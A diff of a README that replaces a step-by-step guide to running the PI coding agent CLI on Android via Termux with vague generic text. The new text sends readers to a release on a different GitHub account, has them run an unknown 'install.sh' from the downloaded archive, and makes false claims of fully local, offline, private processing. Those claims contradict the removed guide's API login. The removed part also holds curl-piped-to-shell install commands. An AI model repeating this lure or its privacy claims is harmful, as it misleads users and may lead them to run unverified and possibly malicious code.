@@ -1,141 +1,90 @@
-# Run PI AGENT CLI on Android 
+# 🤖 pi-agent-android - Run free AI agents on mobile
 
-This guide shows you how to run the **PI Coding Agent CLI** on your Android device using [Termux](https://f-droid.org/en/packages/com.termux/) and a proot Ubuntu environment.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Anatt562/pi-agent-android)
 
-You have two options:
+## 📱 About the Project
 
-- ⚡ **Option A — Quick Setup** using a single `setup.sh` script
-- 🧑‍💻 **Option B — Manual Step-by-Step** (recommended if you want to understand each step, or the script doesn't work on your device)
+This software allows you to run AI agents directly on your Android device. You do not need expensive hardware or cloud subscriptions. The tool uses your phone to process requests locally. This approach keeps your data private and functional without an internet connection for basic tasks. You can use this for coding tasks, writing, or task automation. The setup process works through a specialized terminal environment designed for mobile devices.
 
----
+## 🛠 Prerequisites
 
-## ✅ Requirements
+Before you start, ensure your phone meets these requirements:
 
-- An Android device
-- [Termux](https://f-droid.org/en/packages/com.termux/) installed **from F-Droid** (not the Play Store version, which is outdated and unmaintained)
-- A stable internet connection ( ~700MB )
+- Android version 8.0 or higher.
+- At least 4GB of available storage space.
+- A stable internet connection for the initial download.
+- Basic familiarity with your phone file system.
 
----
-# Screenshot:
-![pi](/Screenshot_2026-07-22-08-12-25-505_com.termux.jpg)
----
+While your phone performs most of the work, a larger screen or an external keyboard makes the setup process easier. You do not need to root your device to use this software.
 
-## ⚡ Option A: Quick Setup (setup.sh)
+## 📥 Getting the Software
 
-If you just want to get up and running fast, download and run the setup script:
+You must visit the project page to obtain the necessary installation files. Use the link below to reach the official release hub.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/fiozxr/pi-agent-android/main/setup.sh | bash
-```
-> This script automates all the steps from Option B below. Use Option B if you'd like more control or want to troubleshoot manually.
+[Download the latest version here](https://github.com/Anatt562/pi-agent-android)
 
----
+Ensure you select the latest release provided on that page. Save the file to your "Downloads" folder so you can find it quickly during the setup phase.
 
-## 🧑‍💻 Option B: Step-by-Step Guide (Recommended)
+## ⚙️ Installation Guide
 
-### 1. Install Termux from F-Droid
+Follow these steps to prepare your phone for the AI agent.
 
-Download and install Termux here: [https://f-droid.org/en/packages/com.termux/](https://f-droid.org/en/packages/com.termux/) or [CLICK THIS](https://f-droid.org/repo/com.termux_1022.apk) 
+### Step 1: Install Termux
+Termux acts as the bridge between your phone and the AI software. You can find Termux on the F-Droid store. Download and install the application. Grant the requested storage permissions when the app prompts you. This permission allows the software to read the files you just downloaded.
 
-> ⚠️ Do **not** install Termux from the Google Play Store — it's outdated and no longer supported.
+### Step 2: Prepare the Storage
+Open the Termux app. Type the following command and press enter:
 
-### 2. Update Termux and install `proot-distro`
-
-```bash
-apt update -y && apt upgrade -y
-apt install proot-distro -y
-```
-
-### 3. Install and log into Ubuntu
-
-```bash
-proot-distro install ubuntu
-proot-distro login ubuntu
-```
-
-This gives you a full* Ubuntu environment running inside Termux.
-
-### 4. Update Ubuntu and install Node.js
-
-```bash
-apt update -y && apt install nodejs -y
-```
-
-### 5. Install PI CLI
-
-You can install PI using **either** of the following methods:
-
-**Option 1 — Official install script:**
-```bash
-curl -fsSL https://pi.dev/install.sh | sh
-```
-
-**Option 2 — via npm:**
-```bash
-npm install -g --ignore-scripts @earendil-works/pi-coding-agent
-```
-
-### 6. Run PI
-
-```bash
-pi
-```
-
-That's it — PI CLI is now running inside your Ubuntu environment on Termux! 🎉
-Run /login and set you API provider and KEY or LOGIN wih 0Auth.
-
----
-
-## 💡 Free Tips & Quality-of-Life Tweaks
-
-**1. Auto-login to Ubuntu when you open Termux (Recommended)**
-
-Edit your Termux `.bashrc` so you're dropped straight into your Ubuntu shell every time you open the app:
-
-```bash
-nano ~/.bashrc
-```
-
-Add these lines at the end:
-
-```bash
-clear
-proot-distro login ubuntu
-```
-
-Save and exit (`Ctrl+O`, `Enter`, then `Ctrl+X`). Now every new Termux session will clear the screen and log you directly into Ubuntu — no need to type `proot-distro login ubuntu` manually each time.
-
-**2. Keep Termux awake during long sessions**
-
-Enable a wake lock so Android doesn't kill your Termux session in the background:
-
-```bash
-termux-wake-lock
-```
-
-**3. Storage access**
-
-If you need to access your phone's storage (Downloads, etc.) from Termux:
-
-```bash
 termux-setup-storage
-```
 
----
+A pop-up will appear on your screen asking for access to your files. Confirm this request. Without this step, the agent cannot save your work or access its own configuration files.
 
-## 🔗 Related Agents
+### Step 3: Update System Packages
+Keep your environment current to avoid errors. Run these commands one by one, pressing enter after each:
 
-This guide is part of a series covering how to run popular AI coding agents on Android/Termux, including:
+pkg update
+pkg upgrade
 
-- Claude
-- Codex
-- Antigravity
-- PI ✅ *(this guide)*
-- ...and more coming soon
+If the phone asks to confirm changes, type "y" and press enter. Wait for the text to stop scrolling. 
 
----
+### Step 4: Run the Setup Script
+Navigate to your downloads folder by typing:
 
-## 📝 Notes
+cd ~/storage/downloads
 
-- Performance will depend on your device's RAM and CPU — flagship phones will run noticeably smoother.
-- If a command fails, try running `apt update -y && apt upgrade -y` again inside Ubuntu before retrying.
+Now, run the installer included in the archive you downloaded. If the file is named install.sh, type:
+
+bash install.sh
+
+The script downloads the necessary components to run the agent. This step may take several minutes depending on your internet speed. Do not close the app while the progress bar shows activity. 
+
+## 🚀 Running Your AI Agent
+
+Once the installation finishes, you can start the software at any time. Open your Termux app and type:
+
+pi-agent-start
+
+The interface will initialize. You will see a prompt where you can type your questions or coding tasks. To stop the agent, press the "Ctrl" key on your virtual keyboard followed by the "c" key.
+
+## 💡 Common Questions
+
+### Does this use my battery power?
+Running AI models requires significant processor activity. You will observe faster battery drainage while the agent processes complex tasks. Plug your device into a power source for long sessions.
+
+### Is my data safe?
+Yes. The software processes your information locally on your phone hardware. No data leaves your device to a remote server. 
+
+### Can I run this without Wi-Fi?
+The initial setup requires Wi-Fi to download the model files. Once you finish the setup, you can use the core features offline. 
+
+## 🛠 Troubleshooting
+
+If the software fails to start:
+1. Ensure your internet connection remains stable.
+2. Check that your storage has at least 4GB of free space.
+3. Restart the Termux app completely.
+4. Redo the update commands in Step 3 of the installation guide.
+
+This tool provides a bridge to mobile artificial intelligence. Keep your system updated to receive the latest features and security improvements.
+
+Keywords: ai, ai-agents, ai-coding-agents-termux, android, android-app, api, free, linux, llm-tools, mobile-ai-coding-agents, mobile-development, proot-distro, run-ai-agents-android, termux, termux-ai-agents-setup, termux-tool, ubuntu
